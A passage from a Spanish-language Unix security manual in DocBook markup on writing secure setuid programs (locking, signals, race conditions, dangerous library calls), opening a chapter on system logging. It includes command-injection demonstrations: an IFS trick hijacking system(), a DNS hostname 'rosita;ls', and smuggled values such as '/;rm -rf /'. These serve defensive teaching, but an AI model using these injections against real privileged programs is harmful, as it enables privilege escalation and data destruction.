     muchos otros a&#x00FA;n permiten que los usuarios &#x2013; especialmente el root &#x2013; creen procesos interpretados y
     setuidados. La potencia de los int&#x00E9;rpretes de &#x00F3;rdenes de Unix hace casi imposible controlar que estos
     programas no realicen acciones no deseadas, violando la seguridad del sistema, por lo que bajo ning&#x00FA;n
     concepto se ha de utilizar un proceso por lotes para realizar acciones privilegiadas de forma
     setuidada.
     </para></listitem>
     <listitem>
     <!--l. 1011--><para>No utilizar creat() para bloquear.
     <!--br/-->Una forma de crear un &#xFB01;chero de bloqueo es invocar a creat() con un modo que no permita la
     escritura del archivo (habitualmente el 000), de forma que si otro usuario tratara de
     hacer lo mismo, su llamada a creat() fallar&#x02CA;&#x0131;a. Esta aproximaci&#x00F3;n, que a primera vista
     parece completamente v&#x00E1;lida, no lo es tanto si la analizamos con detalle: en cualquier
     sistema Unix, la protecci&#x00F3;n que proporcionan los permisos de un &#xFB01;chero s&#x00F3;lo es aplicable si
     quien trata de acceder a &#x00E9;l no es el root. Si esto es as&#x02CA;&#x0131;, es decir, si el UID efectivo del
     usuario que est&#x00E1; accediendo al archivo es 0, los permisos son ignorados completamente y
     el acceso est&#x00E1; permitido; de esta forma, el root puede sobreescribir archivos sin que le
     importen sus bits rwx, lo que implica que si uno de los procesos que compiten por el recurso
     bloqueado est&#x00E1; setuidado a nombre del administrador, el esquema de bloqueo anterior se viene
     abajo.
     <!--br/-->
     <!--br/-->Para poder bloquear recursos en un programa setuidado se utiliza la llamada link(), ya que si se
     intenta crear un enlace a un &#xFB01;chero que ya existe link() falla aunque el proceso que lo invoque sea
     propiedad del root (y aunque el &#xFB01;chero sobre el que se realice no le pertenezca).Tambi&#x00E9;n es posible
     utilizar la llamada al sistema flock() de algunos Unices, aunque es menos recomendable por
     motivos de portabilidad entre clones.
     </para></listitem>
     <listitem>
     <!--l. 1032--><para>Capturar todas las se~nales.

     <!--br/-->Un problema que puede comprometer la seguridad del sistema Unix es el volcado de la imagen en
     memoria de un proceso cuando &#x00E9;ste recibe ciertas se~nales (el cl&#x00E1;sico core dump). Esto
     puede provocar el volcado de informaci&#x00F3;n sensible que el programa estaba leyendo: por
     ejemplo, en versiones del programa login de algunos Unices antiguos, se pod&#x02CA;&#x0131;a leer
     parte de /etc/shadow enviando al proceso la se~nal SIGTERM y consultando el &#xFB01;chero de
     volcado.
     <!--br/-->
     <!--br/-->No obstante, este problema no resulta tan grave como otro tambi&#x00E9;n relacionado con los core dump:
     cuando un programa setuidado vuelca su imagen el &#xFB01;chero resultante tiene el mismo UID que el UID
     real del proceso. Esto puede permitir a un usuario obtener un &#xFB01;chero con permiso de escritura para
     todo el mundo pero que pertenezca a otro usuario (por ejemplo, el root): evidentemente esto es muy
     perjudicial, por lo que parece claro que en un programa setuidado necesitamos capturar todas las
     se~nales que Unix nos permita (recordemos que SIGKILL no puede capturarse ni ignorarse, por norma
     general).
     </para></listitem>
     <listitem>
     <!--l. 1049--><para>Hay que asegurarse de que las veri&#xFB01;caciones realmente veri&#xFB01;can.
     <!--br/-->Otra norma b&#x00E1;sica a la hora de escribir aplicaciones setuidadas es la descon&#xFB01;anza de cualquier
     elemento externo al programa; hemos de veri&#xFB01;car siempre que las entradas (teclado, &#xFB01;cheros&#x2026;) son
     correctas, ya no en su formato sino m&#x00E1;s bien en su origen: &#x00BF;de qui&#x00E9;n proviene un archivo del que
     nuestro programa lee sus datos, de una fuente &#xFB01;able o de un atacante que por cualquier
     m&#x00E9;todo &#x2013; no nos importa cu&#x00E1;l &#x2013; ha conseguido reemplazar ese archivo por otro que &#x00E9;l ha
     creado?
     </para></listitem>
     <listitem>
     <!--l. 1058--><para>Cuidado con las recuperaciones y detecciones de errores.
     <!--br/-->Ante cualquier situaci&#x00F3;n inesperada &#x2013; y por lo general, poco habitual, incluso forzada por un atacante
     &#x2013; un programa setuidado debe detenerse sin m&#x00E1;s; nada de intentar recuperarse del error:
     detenerse sin m&#x00E1;s. Esto, que quiz&#x00E1;s rompe muchos de los esquemas cl&#x00E1;sicos sobre programaci&#x00F3;n
     robusta, tiene una explicaci&#x00F3;n sencilla: cuando un programa detecta una situaci&#x00F3;n inesperada,
     a menudo el programador asume condiciones sobre el error (o sobre su causa) que no
     tienen por qu&#x00E9; cumplirse, lo que suele desembocar en un problema m&#x00E1;s grave que la propia
     situaci&#x00F3;n inesperada. Para cada posible problema que un programa encuentre (entradas muy
     largas, caracteres err&#x00F3;neos o de control, formatos de datos err&#x00F3;neos&#x2026;) es necesario que el
     programador se plantee qu&#x00E9; es lo que su c&#x00F3;digo debe hacer, y ante la m&#x02CA;&#x0131;nima duda detener el
     programa.
     </para></listitem>
     <listitem>
     <!--l. 1071--><para>Cuidado con las operaciones de entrada/salida.
     <!--br/-->La entrada/salida entre el proceso y el resto del sistema constituye otro de los problemas comunes en
     programas setuidados, especialmente a la hora de trabajar con &#xFB01;cheros; las condiciones de carrera
     aqu&#x02CA;&#x0131; son algo demasiado frecuente: el ejemplo cl&#x00E1;sico se produce cuando un programa setuidado
     ha de escribir en un archivo propiedad del usuario que ejecuta el programa (no de su
     propietario). En esta situaci&#x00F3;n lo habitual es que el proceso cree el &#xFB01;chero, realize sobre &#x00E9;l
     un chown() al rUID y al rGID del proceso (es decir, a los identi&#xFB01;cadores de qui&#x00E9;n est&#x00E1;
     ejecutando el programa), y posteriormente escriba en el archivo; el esqueleto del c&#x00F3;digo ser&#x02CA;&#x0131;a el
     siguiente:

         </para><literallayout role="verbatim">
&#x00A0;fd=open(&#x0022;fichero&#x0022;,O&#x005F;CREAT);
&#x00A0;fchown(fd,getuid(),getgid());
&#x00A0;write(fd,buff,strlen(buff));
</literallayout>
     <!--l. 1089--><para>Pero, &#x00BF;qu&#x00E9; sucede si el programa se interrumpe tras realizar el open() pero antes de invocar a
     fchown(), y adem&#x00E1;s el umask del usuario es 0? El proceso habr&#x00E1; dejado un archivo que pertenece
     al propietario del programa (generalmente el root) y que tiene permiso de escritura
     para todo el mundo. La forma m&#x00E1;s efectiva de solucionar el problema consiste en que el
     proceso engendre un hijo mediante fork(), hijo que asignar&#x00E1; a sus eUID y eGID los
     valores de su rUID y rGID (los identi&#xFB01;cadores del usuario que lo ha ejecutado, no de su
     propietario). El padre podr&#x00E1; enviar datos a su hijo mediante pipe(), datos que el hijo escribir&#x00E1; en
     el &#xFB01;chero correspondiente: as&#x02CA;&#x0131; el &#xFB01;chero en ning&#x00FA;n momento tendr&#x00E1; por qu&#x00E9; pertenecer al
     usuario propietario del programa, con lo que evitamos la condici&#x00F3;n de carrera expuesta
     anteriormente.</para></listitem></itemizedlist>
<!--l. 1102--><para>Sin embargo, un correcto estilo de programaci&#x00F3;n no siempre es la soluci&#x00F3;n a los problemas de
seguridad del c&#x00F3;digo; existen llamadas a sistema o funciones de librer&#x02CA;&#x0131;a que son un cl&#x00E1;sico a
la hora de hablar de bugs en nuestro software. Como norma, tras cualquier llamada se ha
de comprobar su valor de retorno y manejar los posibles errores que tenga asociados (<citation>[?]</citation>),
con la evidente excepci&#x00F3;n de las llamadas que est&#x00E1;n dise~nadas para sobreescribir el espacio de
memoria de un proceso (la familia exec() por ejemplo) o las que hacen que el programa &#xFB01;nalice
(t&#x02CA;&#x0131;picamente, exit()) . Algunas de las llamadas consideradas m&#x00E1;s peligrosas (bien porque no
realizan las comprobaciones necesarias, bien porque pueden recibir datos del usuario) son las
siguientes <anchor 
   id="x1-82001f5"  ></anchor><footnote><para>     Que sean peligrosas no signi&#xFB01;ca que algunas de ellas no se deban utilizar nunca, s&#x00F3;lo que si las usamos hemos de tomar
unas m&#x02CA;&#x0131;nimas precauciones.</para></footnote>:
     </para><itemizedlist>
     <listitem>
     <!--l. 1116--><para>system(): Esta es la llamada que cualquier programa setuidado debe evitar a toda costa. Si aparece
     en un c&#x00F3;digo destinado a ejecutarse con privilegios, signi&#xFB01;ca casi con toda certeza un grave problema
     de seguridad; en algunas ocasiones su peligrosidad es obvia (por ejemplo si leemos datos tecleados
     por el usuario y a continuaci&#x00F3;n hacemos un system() de esos datos, ese usuario no tendr&#x02CA;&#x0131;a m&#x00E1;s que
     teclear /bin/bash para conseguir los privilegios del propietario del programa), pero en otras no
     lo es tanto: imaginemos un c&#x00F3;digo que invoque a system() de una forma similar a la
     siguiente:

         </para><literallayout role="verbatim">
&#x00A0;#include&#x00A0;&#x003C;stdio.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;stdlib.h&#x003E;
&#x00A0;
&#x00A0;main(){
&#x00A0;system(&#x0022;/bin/ls&#x0022;);
&#x00A0;}
</literallayout>
     <!--l. 1135--><para>El programa anterior se limitar&#x02CA;&#x0131;a a realizar un listado del directorio desde el que lo ejecutemos. Al
     menos en teor&#x02CA;&#x0131;a, ya que podemos comprobar que no es dif&#x02CA;&#x0131;cil &#x2018;enga~nar&#x2019; a system(): no tenemos m&#x00E1;s
     que modi&#xFB01;car la variable de entorno $IFS (Internal Field Separator) del shell desde
     el que ejecutemos el programa para conseguir que este c&#x00F3;digo ejecute realmente lo que
     nosotros le indiquemos. Esta variable delimita las palabras (o s&#x02CA;&#x0131;mbolos) en una l&#x02CA;&#x0131;nea de
     &#x00F3;rdenes, y por defecto suele estar inicializada a Espacio, Tabulador, y Nueva L&#x02CA;&#x0131;nea (los
     separadores habituales de palabras); pero, &#x00BF;qu&#x00E9; sucede si le indicamos al shell que el
     nuevo car&#x00E1;cter separador va a ser la barra, &#x2018;/&#x2019;?. Muy sencillo: ejecutar &#x2018;/bin/ls&#x2019; ser&#x00E1;
     equivalente a ejecutar &#x2018;bin ls&#x2019;, es decir, una posible orden denominada &#x2018;bin&#x2019; que
     recibe como par&#x00E1;metro &#x2018;ls&#x2019;. Por ejemplo, bajo SunOS &#x2013; bajo la mayor&#x02CA;&#x0131;a de Unices &#x2013;, y
     utilizando sh (no bash) podemos hacer que &#x2018;bin&#x2019; sea un programa de nuestra elecci&#x00F3;n, como
     &#x2018;id&#x2019;:

         </para><literallayout role="verbatim">
&#x00A0;$&#x00A0;cp&#x00A0;/bin/id&#x00A0;bin
&#x00A0;$&#x00A0;ejemplo
&#x00A0;bin&#x00A0;&#x00A0;ejemplo.c&#x00A0;&#x00A0;ejemplo
&#x00A0;$&#x00A0;IFS=/
&#x00A0;$&#x00A0;export&#x00A0;IFS
&#x00A0;$&#x00A0;ejemplo
&#x00A0;uid=672(toni)&#x00A0;gid=10(staff)
&#x00A0;$
</literallayout>
     <!--l. 1162--><para>Como podemos ver, acabamos de ejecutar un programa arbitrario; si en lugar de &#x2018;id&#x2019; hubi&#x00E9;ramos
     escogido un int&#x00E9;rprete de &#x00F3;rdenes, como &#x2018;bash&#x2019; o &#x2018;sh&#x2019;, habr&#x02CA;&#x0131;amos ejecutado ese shell. Y si el
     programa anterior estuviera setudiado, ese shell se habr&#x02CA;&#x0131;a ejecutado con los privilegios del propietario
     del archivo (si imaginamos que fuera root, podemos hacernos una idea de las implicaciones de
     seguridad que esto representa).
     </para></listitem>
     <listitem>
     <!--l. 1169--><para>exec(), popen(): Similares a la anterior; es preferible utilizar execv() o execl(), pero si han de
     recibir par&#x00E1;metros del usuario sigue siendo necesaria una estricta comprobaci&#x00F3;n de los
     mismos.
     </para></listitem>
     <listitem>
     <!--l. 1172--><para>setuid(), setgid()&#x2026;: Los programas de usuario no deber&#x02CA;&#x0131;an utilizar estas llamadas, ya que no han
     de tener privilegios innecesarios.
     </para></listitem>
     <listitem>
     <!--l. 1175--><para>strcpy(), strcat(), sprintf(), vsprintf()&#x2026;: Estas funciones no comprueban la longitud de las
     cadenas con las que trabajan, por lo que son una gran fuente de bu&#xFB00;er over&#xFB02;ows. Se han de sustituir
     por llamadas equivalentes que s&#x02CA;&#x0131; realicen comprobaci&#x00F3;n de l&#x02CA;&#x0131;mites (strncpy(), strncat()&#x2026;) y, si no
     es posible, realizar dichas comprobaciones manualmente.
     </para></listitem>
     <listitem>
     <!--l. 1181--><para>getenv(): Otra excelente fuente de desbordamientos de bu&#xFB00;er; adem&#x00E1;s, el uso que hagamos de la
     informaci&#x00F3;n le&#x02CA;&#x0131;da puede ser peligroso, ya que recordemos que es el usuario el que generalmente puede
     modi&#xFB01;car el valor de las variables de entorno. Por ejemplo, &#x00BF;qu&#x00E9; suceder&#x02CA;&#x0131;a si ejecutamos desde un
     programa una orden como &#x2018;cd $HOME&#x2019;, y resulta que esta variable de entorno no corresponde a un
     nombre de directorio sino que es de la forma &#x2018;/;rm -rf /&#x2019;? Si algo parecido se hace
     desde un programa que se ejecute con privilegios en el sistema, podemos imaginarnos las
     consecuencias&#x2026;
     </para></listitem>
     <listitem>
     <!--l. 1189--><para>gets(), scanf(), fscanf(), getpass(), realpath(), getopt()&#x2026;: Estas funciones no realizan las
     comprobaciones adecuadas de los datos introducidos, por lo que pueden desbordar en algunos casos
     el bu&#xFB00;er destino o un bu&#xFB00;er est&#x00E1;tico interno al sistema. Es preferible el uso de read() o fgets()
     siempre que sea posible (incluso para leer una contrase~na, haciendo por supuesto que no se escriba
     en pantalla), y si no lo es al menos realizar manualmente comprobaciones de longitud de los datos
     le&#x02CA;&#x0131;dos.

     </para></listitem>
     <listitem>
     <!--l. 1197--><para>gethostbyname(), gethostbyaddr(): Seguramente ver las amenazas que provienen del uso de estas
     llamadas no es tan inmediato como ver las del resto; generalmente hablamos de desbordamiento de
     bu&#xFB00;ers, de comprobaciones de l&#x02CA;&#x0131;mites de datos introducidos por el usuario&#x2026;pero no nos paramos a
     pensar en datos que un atacante no introduce directamente desde teclado o desde un archivo, pero
     cuyo valor puede forzar incluso desde sistemas que ni siquiera son el nuestro. Por ejemplo, todos
     tendemos a asumir como ciertas las informaciones que un servidor DNS &#x2013; m&#x00E1;s o menos &#xFB01;ables, por
     ejemplo alguno de nuestra propia organizaci&#x00F3;n &#x2013; nos brinda. Imaginemos un programa como el
     siguiente (se han omitido las comprobaciones de errores habituales por cuestiones de
     claridad):

         </para><literallayout role="verbatim">
&#x00A0;#include&#x00A0;&#x003C;stdio.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;stdlib.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;netdb.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;unistd.h&#x003E;
&#x00A0;#include&#x00A0;&#x003C;arpa/inet.h&#x003E;
&#x00A0;
&#x00A0;int&#x00A0;main(int&#x00A0;argc,&#x00A0;char&#x00A0;**argv){
&#x00A0;struct&#x00A0;in&#x005F;addr&#x00A0;*dir=(struct&#x00A0;in&#x005F;addr&#x00A0;*)malloc(sizeof(struct&#x00A0;in&#x005F;addr));
&#x00A0;struct&#x00A0;hostent&#x00A0;*maquina=(struct&#x00A0;hostent&#x00A0;*)malloc(sizeof(struct&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hostent));
&#x00A0;char&#x00A0;*orden=(char&#x00A0;*)malloc(30);
&#x00A0;dir-&#x003E;s&#x005F;addr=inet&#x005F;addr(*++argv);
&#x00A0;maquina=gethostbyaddr((char&#x00A0;*)dir,sizeof(struct&#x00A0;in&#x005F;addr),AF&#x005F;INET);
&#x00A0;sprintf(orden,&#x0022;finger&#x00A0;@%s&#x005C;n&#x0022;,maquina-&#x003E;h&#x005F;name);
&#x00A0;system(orden);
&#x00A0;return(0);
&#x00A0;}
</literallayout>
     <!--l. 1230--><para>Este c&#x00F3;digo recibe como argumento una direcci&#x00F3;n IP, obtiene su nombre v&#x02CA;&#x0131;a /etc/hosts o DNS,y
     ejecuta un finger sobre dicho nombre; aparte de otros posibles problemas de seguridad (por
     ejemplo, &#x00BF;ser&#x02CA;&#x0131;amos capaces de procesar cualquier informaci&#x00F3;n que devuelva el finger?, &#x00BF;qu&#x00E9; sucede
     con la llamada a system()?), nada extra~no ha de suceder si el nombre de m&#x00E1;quina devuelto al
     programa es &#x2018;normal&#x2019;:

         </para><literallayout role="verbatim">
&#x00A0;luisa:~/tmp$&#x00A0;./ejemplo&#x00A0;192.168.0.1
&#x00A0;[rosita]
&#x00A0;No&#x00A0;one&#x00A0;logged&#x00A0;on.
&#x00A0;luisa:~/tmp$
</literallayout>
     <!--l. 1245--><para>Pero, &#x00BF;qu&#x00E9; pasar&#x02CA;&#x0131;a si en lugar de devolver un nombre &#x2018;normal&#x2019; (como &#x2018;rosita&#x2019;) se devuelve un
     nombre algo m&#x00E1;s elaborado, como &#x2018;rosita;ls&#x2019;? Podemos verlo:

         </para><literallayout role="verbatim">
&#x00A0;luisa:~/tmp$&#x00A0;./ejemplo&#x00A0;192.168.0.1
&#x00A0;[rosita;ls]
&#x00A0;No&#x00A0;one&#x00A0;logged&#x00A0;on.
&#x00A0;ejemplo&#x00A0;&#x00A0;ejemplo.c
&#x00A0;luisa:~/tmp$
</literallayout>
     <!--l. 1257--><para>Exactamente: se ha ejecutado la orden &#x2018;finger @rosita;ls&#x2019; (esto es, un &#x2018;finger&#x2019; a la m&#x00E1;quina
     seguido de un &#x2018;ls&#x2019;). Podemos imaginar los efectos que tendr&#x02CA;&#x0131;a el uso de este programa si
     sustituimos el inocente &#x2018;ls&#x2019; por un &#x2018;rm -rf $HOME&#x2019;. Un atacante que consiga controlar un servidor
     DNS (algo no muy complicado) podr&#x02CA;&#x0131;a inyectarnos datos maliciosos en nuestra m&#x00E1;quina sin ning&#x00FA;n
     problema. Para evitar esta situaci&#x00F3;n debemos hacer una doble b&#x00FA;squeda inversa y adem&#x00E1;s no hacer
     ninguna suposici&#x00F3;n sobre la correcci&#x00F3;n o el formato de los datos recibidos; en nuestro c&#x00F3;digo debemos
     insertar las comprobaciones necesarias para asegurarnos de que la informaci&#x00F3;n que recibimos no nos
     va a causar problemas.
     </para></listitem>
     <listitem>
     <!--l. 1267--><para>syslog(): Hemos de tener la precauci&#x00F3;n de utilizar una versi&#x00F3;n de esta funci&#x00F3;n de librer&#x02CA;&#x0131;a que
     compruebe la longitud de sus argumentos; si no lo hacemos y esa longitud sobrepasa un cierto l&#x02CA;&#x0131;mite
     (generalmente, 1024 bytes) podemos causar un desbordamiento en los bu&#xFB00;ers de nuestro sistema de
     log, dej&#x00E1;ndolo inutilizable.
     </para></listitem>
     <listitem>
     <!--l. 1272--><para>realloc(): Ning&#x00FA;n programa &#x2013; privilegiado o no &#x2013; que maneje datos sensibles (por ejemplo,
     contrase~nas, correo electr&#x00F3;nico&#x2026;y especialmente aplicaciones criptogr&#x00E1;&#xFB01;cas) debe utilizar esta llamada;
     realloc() se suele utilizar para aumentar din&#x00E1;micamente la cantidad de memoria reservada para un
     puntero. Lo habitual es que la nueva zona de memoria sea contigua a la que ya estaba reservada,
     pero si esto no es posible realloc() copia la zona antigua a una nueva ubicaci&#x00F3;n donde pueda
     a~nadirle el espacio especi&#xFB01;cado. &#x00BF;Cu&#x00E1;l es el problema? La zona de memoria antigua se libera
     (perdemos el puntero a ella) pero no se pone a cero, con lo que sus contenidos permanecen
     inalterados hasta que un nuevo proceso reserva esa zona; accediendo a bajo nivel a la memoria (por
     ejemplo, leyendo /proc/kcore o /dev/kmem) ser&#x02CA;&#x0131;a posible para un atacante tener acceso a esa
     informaci&#x00F3;n.
     <!--br/-->Realmente, malloc() tampoco pone a cero la memoria reservada, por lo que a primera vista puede
     parecer que cualquier proceso de usuario (no un acceso a bajo nivel, sino un simple malloc() en
     un programa) podr&#x02CA;&#x0131;a permitir la lectura del antiguo contenido de la zona de memoria
     reservada. Esto es falso si se trata de nueva memoria que el n&#x00FA;cleo reserva para el proceso
     invocador: en ese caso, la memoria es limpiada por el propio kernel del operativo, que invoca
     a kmalloc() (en el caso de Linux, en otros Unices el nombre puede variar aunque la
     idea sea la misma) para hacer la reserva. Lo que s&#x02CA;&#x0131; es posible es que si liberamos una
     zona de memoria (por ejemplo con free()) y a continuaci&#x00F3;n la volvemos a reservar, en
     el mismo proceso, podamos acceder a su contenido: esa zona no es &#x2018;nueva&#x2019; (es decir,
     el n&#x00FA;cleo no la ha reservado de nuevo), sino que ya pertenec&#x02CA;&#x0131;a al proceso. De cualquier
     forma, si vamos a liberar una zona en la que est&#x00E1; almacenada informaci&#x00F3;n sensible, lo
     mejor en cualquier caso es ponerla a cero manualmente, por ejemplo mediante bzero() o
     memset().
     </para></listitem>
     <listitem>
     <!--l. 1301--><para>open(): El sistema de &#xFB01;cheros puede modi&#xFB01;carse durante la ejecuci&#x00F3;n de un programa de formas que
     en ocasiones ni siquiera imaginamos; por ejemplo, en Unix se ha de evitar escribir siguiendo
     enlaces de archivos inesperados (un archivo que cambia entre una llamada a lstat() para

     comprobar si existe y una llamada a open() para abrirlo en caso positivo, como hemos visto
     antes). No obstante, no hay ninguna forma de realizar esta operaci&#x00F3;n at&#x00F3;micamente sin
     llegar a mecanismos de entrada/salida de muy bajo nivel; Peter Gutmann propone el
     siguiente c&#x00F3;digo para asegurarnos de que estamos realizando un open() sobre el archivo
     que realmente queremos abrir, y no sobre otro que un atacante nos ha puesto en su
     lugar:

         </para><literallayout role="verbatim">
&#x00A0;struct&#x00A0;stat&#x00A0;lstatInfo;
&#x00A0;char&#x00A0;*mode=&#x0022;rb+&#x0022;;
&#x00A0;int&#x00A0;fd;
&#x00A0;
&#x00A0;if(lstat(fileName,&#x0026;lstatInfo)==-1)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;{
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if(errno!=ENOENT)&#x00A0;return(&#x00A0;-1&#x00A0;);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if((fd=open(fileName,O&#x005F;CREAT|O&#x005F;EXCL|O&#x005F;RDWR,0600))==-1)&#x00A0;return(-1);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mode=&#x0022;wb&#x0022;;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;}
&#x00A0;else
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;{
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;struct&#x00A0;stat&#x00A0;fstatInfo;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if((fd=open(fileName,O&#x005F;RDWR))==-1)&#x00A0;return(-1);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if(fstat(fd,&#x0026;fstatInfo)==-1&#x00A0;||&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;lstatInfo.st&#x005F;mode!=fstatInfo.st&#x005F;mode&#x00A0;||&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;lstatInfo.st&#x005F;ino!=fstatInfo.st&#x005F;ino&#x00A0;||&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;lstatInfo.st&#x005F;dev!=fstatInfo.st&#x005F;dev)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;{
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;close(fd);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;return(-1);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;}
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if(fstatInfo.st&#x005F;nlink&#x003E;1||!S&#x005F;ISREG(lstatInfo.st&#x005F;mode))
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;{
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;close(fd);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;return(-1);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;}
&#x00A0;#ifdef&#x00A0;NO&#x005F;FTRUNCATE
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;close(fd);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if((fd=open(fileName,O&#x005F;CREAT|O&#x005F;TRUNC|O&#x005F;RDWR))==-1)&#x00A0;return(&#x00A0;-1&#x00A0;);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mode=&#x0022;wb&#x0022;;
&#x00A0;#else
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ftruncate(fd,0);
&#x00A0;#endif&#x00A0;/*&#x00A0;NO&#x005F;FTRUNCATE&#x00A0;*/
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;}
&#x00A0;stream-&#x003E;filePtr=fdopen(fd,mode);
&#x00A0;if(stream-&#x003E;filePtr==NULL)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;{
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;close(fd);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;unlink(fileName);
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;return(-1);&#x00A0;&#x00A0;/*&#x00A0;Internal&#x00A0;error,&#x00A0;should&#x00A0;never&#x00A0;happen&#x00A0;*/
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;}
&#x00A0;}
</literallayout>
     <!--l. 1359--><para>Como podemos ver, algo tan elemental como una llamada a open() se ha convertido en todo el c&#x00F3;digo
     anterior si queremos garantizar unas m&#x02CA;&#x0131;nimas medidas de seguridad; esto nos puede dar una idea de
     hasta que punto la programaci&#x00F3;n &#x2018;segura&#x2019; puede complicarse. No obstante, en muchas ocasiones es
     preferible toda la complicaci&#x00F3;n y parafernalia anteriores para realizar un simple open() a que esa
     llamada se convierta en un fallo de seguridad en nuestro sistema. No hay ning&#x00FA;n programa que
     se pueda considerar perfecto o libre de errores (como se cita en el cap&#x02CA;&#x0131;tulo 23 de <citation>[?]</citation>,
     una rutina de una librer&#x02CA;&#x0131;a puede tener un fallo&#x2026;o un rayo gamma puede alterar un bit
     de memoria para hacer que nuestro programa se comporte de forma inesperada), pero
     cualquier medida que nos ayude a minimizar las posibilidades de problemas es siempre
     positiva.</para></listitem></itemizedlist>


<!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-830006"  ></anchor>Auditor&#x02CA;&#x0131;a del sistema</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">6.1</abbrev><anchor 
   id="x1-840006.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  Casi todas las actividades realizadas en un sistema Unix son susceptibles de ser, en mayor o menor
medida, monitorizadas: desde las horas de acceso de cada usuario al sistema hasta las p&#x00E1;ginas web m&#x00E1;s
frecuentemente visitadas, pasando por los intentos fallidos de conexi&#x00F3;n, los programas ejecutados o incluso
el tiempo de CPU que cada usuario consume. Obviamente esta facilidad de Unix para recoger informaci&#x00F3;n
tiene unas ventajas inmediatas para la seguridad: es posible detectar un intento de ataque nada m&#x00E1;s
producirse el mismo, as&#x02CA;&#x0131; como tambi&#x00E9;n detectar usos indebidos de los recursos o actividades
&#x2018;sospechosas&#x2019;; sin embargo, existen tambi&#x00E9;n desventajas, ya que la gran cantidad de informaci&#x00F3;n que
potencialmente se registra puede ser aprovechada para crear negaciones de servicio o, m&#x00E1;s habitualmente,
esa cantidad de informaci&#x00F3;n puede hacer dif&#x02CA;&#x0131;cil detectar problemas por el volumen de datos a
analizar.
<!--br/-->
<!--br/-->Algo muy interesante de los archivos de log en Unix es que la mayor&#x02CA;&#x0131;a de ellos son simples &#xFB01;cheros de
texto, que se pueden visualizar con un simple cat. Por una parte esto es bastante c&#x00F3;modo para el
administrador del sistema, ya que no necesita de herramientas especiales para poder revisar los logs
(aunque existen algunas utilidades para hacerlo, como swatch) e incluso puede programar shellscripts para
comprobar los informes generados de forma autom&#x00E1;tica, con &#x00F3;rdenes como awk, grep o sed. No obstante, el
hecho de que estos &#xFB01;cheros sean texto plano hace que un atacante lo tenga muy f&#x00E1;cil para ocultar ciertos
registros modi&#xFB01;cando los archivos con cualquier editor de textos; esto implica una cosa muy
importante para un administrador: nunca ha de con&#xFB01;ar al 100 % en lo que los informes de auditor&#x02CA;&#x0131;a
del sistema le digan. Para minimizar estos riesgos se pueden tomar diversas medidas, desde
algunas quiz&#x00E1;s demasiado complejas para entornos habituales (<citation>[?]</citation>) hasta otras m&#x00E1;s sencillas pero
igualmente efectivas, como utilizar una m&#x00E1;quina &#xFB01;able para registrar informaci&#x00F3;n del sistema
o incluso enviar los registros m&#x00E1;s importantes a una impresora; m&#x00E1;s adelante hablaremos de
ellas.
  </para></section><!--end section--><!--l. 34--><section 
role="section"><title><abbrev role="title-mark">6.2</abbrev><anchor 
   id="x1-850006.2"  ></anchor>El sistema de log en Unix</title>
<!--l. 35--><para>  Una desventaja a~nadida al sistema de auditor&#x02CA;&#x0131;a en Unix puede ser la complejidad que puede alcanzar
una correcta con&#xFB01;guraci&#x00F3;n; por si la di&#xFB01;cultad del sistema no fuera su&#xFB01;ciente, en cada Unix el sistema de
logs tiene peculiaridades que pueden propiciar la p&#x00E9;rdida de informaci&#x00F3;n interesante de cara al
mantenimiento de sistemas seguros. Aunque muchos de los &#xFB01;cheros de log de los que hablaremos a
